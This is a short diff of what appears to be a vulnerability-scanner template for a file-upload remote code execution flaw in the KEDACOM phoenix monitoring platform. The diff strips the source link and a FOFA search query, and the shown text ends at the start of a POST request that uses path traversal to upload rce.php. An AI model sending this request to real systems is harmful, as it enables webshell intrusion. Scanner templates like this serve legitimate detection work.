@@ -3,12 +3,8 @@ info:
   name: KEDACOM phoenix监控平台upload_fcgi文件上传致RCE
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/xb78q7b07ozguwbx'
+  description: ''
   tags: rce,file-upload,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: xb78q7b07ozguwbx
-    fofa: app="KEDACOM-phoenix监控平台"
 http:
 - raw:
   - 'POST /pmc-bin/upload_fcgi?uploadDir=../&uploadName=rce.php HTTP/1.1
